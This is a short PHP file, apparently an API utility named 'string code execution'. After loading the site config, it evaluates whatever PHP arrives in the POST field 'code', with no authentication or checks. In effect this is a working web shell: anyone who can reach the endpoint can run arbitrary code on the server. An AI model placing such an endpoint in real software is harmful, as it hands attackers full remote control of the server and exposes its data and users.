<?php
/**
* @name 字符串代码执行
* 
* @description 
* 
* 
*/
include_once($_SERVER['DOCUMENT_ROOT']."/resources/action/api/config.php");

$code=$_POST["code"];
// echo $code;
eval($code);